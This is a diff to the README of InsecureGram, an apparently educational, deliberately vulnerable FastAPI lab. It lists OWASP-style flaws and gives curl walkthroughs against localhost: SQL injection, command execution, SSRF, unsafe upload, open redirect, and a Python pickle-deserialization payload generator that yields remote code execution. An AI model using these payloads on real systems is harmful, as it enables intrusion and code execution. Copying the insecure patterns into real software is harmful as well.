@@ -1,5 +1,7 @@
 # 🛡️ InsecureGram: A Deliberately Vulnerable FastAPI API
 
+![1000104142](https://github.com/user-attachments/assets/56405ce4-b853-4d83-bbe1-715762a4c6a4)
+
 Welcome to InsecureGram — a deliberately insecure RESTful API built using FastAPI to demonstrate real-world web application vulnerabilities, based on the [OWASP Top 10](https://owasp.org/www-project-top-ten/). It is meant for educational and research purposes only.
 
 > ⚠️ This project is intentionally insecure. Do not deploy this in a production environment.
@@ -11,12 +13,14 @@ Welcome to InsecureGram — a deliberately insecure RESTful API built using Fast
 This API mimics a realistic backend service similar to a social media app. It includes endpoints for:
 
 - User registration and login with JWT
-- User profiles and search
+- User profiles and search (SQL injection)
 - Command execution
 - File upload
 - SSRF simulation
-- External API interaction
 - Legacy and admin routes
+- open redirection
+- Insecure deserialization
+- Hardcoded secrets
 
 ---
 
@@ -31,16 +35,15 @@ InsecureGram/
 │   ├── models.py                # SQLAlchemy User model
 │   ├── config.py                # Global config and JWT secret key
 │   ├── dependencies.py          # Shared auth logic (get_current_user)
-│   ├── routers/
-│   │   ├── auth.py              # Login and registration endpoints
-│   │   ├── users.py             # Search, profiles, legacy access
-│   │   ├── upload.py            # File upload (unsafe mode)
-│   │   ├── exec.py              # Remote command execution (RCE)
-│   │   ├── proxy.py             # SSRF endpoint
-│   │   ├── admin.py             # Admin-only data access
-│   │   └── external.py          # External request simulation
-│   ├── ssrf_target.py           # SSRF internal FastAPI server (optional)
-│
+│   ├── auth.py                  # Login and registration endpoints
+│   ├── users.py                 # Search, profiles, legacy access
+│   ├── upload.py                # File upload (unsafe mode)
+│   ├── command.py               # Remote command execution (RCE)
+│   ├── proxy.py                 # SSRF endpoint
+│   ├── admin.py                 # Admin-only data access
+│   ├── deprecated.py            # Legacy endpoint
+│   ├── redirect.py              # open redirection enbpoint
+│   ├── ssrf_server.py           # SSRF internal FastAPI server (optional)
 ├── static/uploads/              # Uploaded files
 ├── test.db                      # SQLite DB (created at runtime)
 ├── Dockerfile                   # Docker config
@@ -53,22 +56,20 @@ InsecureGram/
 ## 🚨 Vulnerabilities Covered
 
 This project contains examples of the following vulnerabilities:
+| #   | Vulnerability                           | Description                                             |
+| --- | --------------------------------------- | ------------------------------------------------------- |
+| V1  | Admin header-based authentication       | Admin API uses static API key in header (X-API-KEY) for endpoints /api/admin/users and /api/admin/deserialize    |
+| V2  | SQL Injection (SQLi)                    | Raw SQL query constructed from user input               |
+| V3  | Hardcoded secrets                       | SECRET_KEY and admin API key stored in config.py       |
+| V4  | Open CORS policy                        | Accepts requests from any origin                        |
+| V5  | JWT with guessable secret               | Secret used to sign tokens is weak                      |
+| V6  | Insecure deserialization (pickle)       | Admin endpoint loads raw Python pickle                  |
+| V7 | Server-Side Request Forgery (SSRF)      | Proxy endpoint makes arbitrary HTTP GET requests        |
+| V8 | Unsafe file uploads                     | Allows writing files outside upload dir if unsafe=true  |
+| V9 | Open Redirect                           | Redirect endpoint blindly forwards to user-supplied URL |
+| V10 | Remote Command Execution (RCE)          | /api/cmd/exec executes system commands unsafely             |
+| V11 | Deprecated API Exposure (/api/v1/users/info)          | Legacy API endpoint still active             |
 
-| ID   | Category                     | Description |
-|------|------------------------------|-------------|
-| V1   | Broken Authentication        | Weak JWT management and no refresh logic |
-| V2   | Sensitive Data Exposure      | Hardcoded secrets, leaked files |
-| V3   | SQL Injection                | Raw query fallback in `/users/search` |
-| V4   | Broken Access Control        | Users can access others' data |
-| V5   | Security Misconfiguration    | SSRF, unrestricted internal access |
-| V6   | Insecure Deserialization     | Arbitrary file upload with octet-stream |
-| V7   | Using Components with Known Vulns | No dependency control |
-| V8   | Insufficient Logging & Monitoring | No request audit logging |
-| V9   | Remote Code Execution        | Via `/cmd/exec` route |
-| V10  | SSRF                         | `/proxy` endpoint accesses arbitrary URLs |
-| V11  | Insecure File Upload         | Unsafe flag allows overwrite |
-| V12  | Open CORS Policy             | Missing origin validation allows API access from external domains |
-| V13  | JWT Tampering                | JWT creation using exposed secret key |
 
 ---
 
@@ -95,30 +96,39 @@ Here’s how you can interact with the API using `curl`:
 
 🔐 Register
 ```bash
-curl -X POST http://localhost:8000/auth/register -H "Content-Type: application/json" \
+curl -i -X POST http://localhost:8000/api/auth/register -H "Content-Type: application/json" \
 -d '{"username": "alice", "password": "alice123"}'
 ```
 
 🔐 Login
 ```bash
-curl -X POST http://localhost:8000/auth/login -H "Content-Type: application/json" \
--d '{"username": "alice", "password": "alice123"}'
+curl -i -X POST http://localhost:8000/api/auth/login \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "username=alice&password=alice123"
+```
+
+---
+
+### 🆔 User Info (No IDOR :), Type your own id)
+
+```bash
+curl -i -G http://localhost:8000/api/users/{User_ID} \
+-H "Authorization: Bearer <JWT>"
 ```
 
 ---
 
 ### 🔎 User Search (SQLi vulnerable)
 ```bash
-curl -G http://localhost:8000/users/search \
+curl -i -G http://localhost:8000/api/users/search \
 -H "Authorization: Bearer <JWT>" \
 --data-urlencode "field=username" --data-urlencode "keyword=' OR 1=1 --"
 ```
 
 ---
-
 ### 📁 File Upload (Unsafe mode)
 ```bash
-curl -X POST http://localhost:8000/upload?unsafe=true \
+curl -i -X POST http://localhost:8000/api/upload?unsafe=true \
 -F "file=@evil.py" \
 -H "Authorization: Bearer <JWT>"
 ```
@@ -127,48 +137,137 @@ curl -X POST http://localhost:8000/upload?unsafe=true \
 
 ### 💣 Remote Command Execution (RCE)
 ```bash
-curl -G http://localhost:8000/cmd/exec \
+curl -i -G http://localhost:8000/api/cmd/exec \
 -H "Authorization: Bearer <JWT>" \
---data-urlencode "cmd=id"
+--data-urlencode "cmd=whoami"
 ```
 
 ---
 
-### 🛰️ SSRF
+### 🛰️ SSRF (127.0.0.1:9000 is internal service that is not accessed by normal clients)
 ```bash
-curl -G http://localhost:8000/proxy \
+curl -i -G http://localhost:8000/api/proxy \
 -H "Authorization: Bearer <JWT>" \
---data-urlencode "url=http://127.0.0.1:8081/read?name=/etc/passwd"
+--data-urlencode "url=http://127.0.0.1:9000/read?name=secrets.txt"
 ```
 
 ---
 
 ### 🗂️ Admin Access (with API key)
 ```bash
-curl -H "Authorization: Bearer <JWT>" \
+curl -i -H "Authorization: Bearer <JWT>" \
 -H "X-API-KEY: admin123" \
-http://localhost:8000/admin/users
+http://localhost:8000/api/admin/users
+```
+
+---
+
+### 🧬💥 RCE With Insecure Deserialization (with API key)
+
+To exploit this, first craft a malicious Pickle payload in Python:
+
+```exploit_payload.py```:
+```python
+import pickle
+import subprocess
+
+payload = pickle.dumps((
+subprocess.check_output,
+(["whoami"],)
+)).hex()
+
+print(payload)
+```
+Run the script to generate a hexadecimal payload string.
+
+Example output: ```8004952f000000000000008c0a73756270726f63657373948c0c636865636b5f6f75747075749493945d948c0677686f616d699461859486942e```
+
+Then, send it using curl to the vulnerable endpoint:
+
+```bash
+curl -i -X POST http://localhost:8000/api/admin/deserialize \
+-H "Authorization: Bearer <JWT>" \
+-H "X-API-KEY: admin123" \
+-H "Content-Type: application/json" \
+-d '{"payload": "8004952f000000000000008c0a73756270726f63657373948c0c636865636b5f6f75747075749493945d948c0677686f616d699461859486942e"}'
+
+```
+If successful, the server will execute the command (e.g., whoami) and return the result in the output.
+
+#### Response:
+
+```bash
+{
+"output": "kali\n"
+}
+```
+
+
+---
+
+### 🗂️ Insecure Redirection
+```bash
+curl -i -H "Authorization: Bearer <JWT>" \
+http://localhost:8000/api/redirect?target=https://evil.com
 ```
 
 ---
 
 ### 📡 Legacy API Endpoint
 ```bash
-curl http://localhost:8000/v1/users/info
+curl -H "Authorization: Bearer <JWT>" \
+http://localhost:8000/api/v1/users/info
+
 ```
 
 ---
 
-## 🐳 Running with Docker Compose
+# 🚀 How to Run the Project
+
+Choose one of the following methods to start the API server:
+
+## 1- 🐳 Run with Docker (Recommended)
+
+- Step 1: Clone the repository
 
 ```bash
-docker-compose up --build
+git clone https://github.com/your-username/insecuregram.git
+cd insecuregram
 ```
 
-This runs:
-- `app`: The vulnerable API at http://localhost:8000
-- `ssrf_target`: Internal server for SSRF testing at http://localhost:8081
+- Step 2: Build and run the containers
 
+```bash
+docker compose up --build
+```
+
+This will launch the FastAPI application and an SQLite-backed service in a containerized environment.
+
+- Step 3: Access the API
+
+Visit http://localhost:8000/docs in your browser.
+
+## 2- 💻 Run Locally (Without Docker)
+
+Ensure Python 3.12 and pipenv are installed.
+
+- Step 1: Install dependencies
+
+```bash
+pipenv install
+```
+
+- Step 2: Activate the virtual environment
+  
+```bash
+pipenv shell
+```
+
+- Step 3: Run the FastAPI server
+  
+```bash
+uvicorn app.main:app --reload
+```
 ---
 
 ## 🚫 Disclaimer
